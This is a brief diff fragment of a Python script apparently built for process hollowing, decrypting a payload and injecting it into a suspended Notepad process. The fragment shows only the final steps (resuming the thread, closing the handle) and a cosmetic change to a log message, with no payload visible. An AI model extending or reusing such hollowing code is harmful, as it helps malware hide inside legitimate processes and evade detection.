@@ -168,7 +168,7 @@ def decrypt_and_hollow():
     logging.info("[THREAD] Resuming Notepad execution...")
     win32process.ResumeThread(thread_handle)
     ctypes.windll.kernel32.CloseHandle(int(process_handle))
-    logging.info("✅ [SUCCESS] Process Hollowing Completed Successfully.")
+    logging.info("[SUCCESS] Process Hollowing Completed Successfully.")
     return True
 
 # Run Encryption & Hollowing
